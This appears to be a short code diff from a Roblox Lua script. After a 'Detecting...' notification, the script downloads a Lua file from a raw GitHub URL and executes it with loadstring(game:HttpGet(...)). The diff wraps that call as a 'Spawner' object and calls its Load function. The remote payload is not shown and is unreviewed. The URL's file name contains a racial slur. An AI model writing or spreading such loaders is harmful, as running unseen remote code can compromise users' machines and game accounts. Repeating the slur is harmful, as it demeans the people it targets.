@@ -5,4 +5,6 @@ game.StarterGui:SetCore("SendNotification", {
     Text = "Detecting...",
     Duration = 6
 })
+local Spawner = 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/iwantsom3/script/refs/heads/main/Niggggfd.lua"))()
+Spawner.Load()
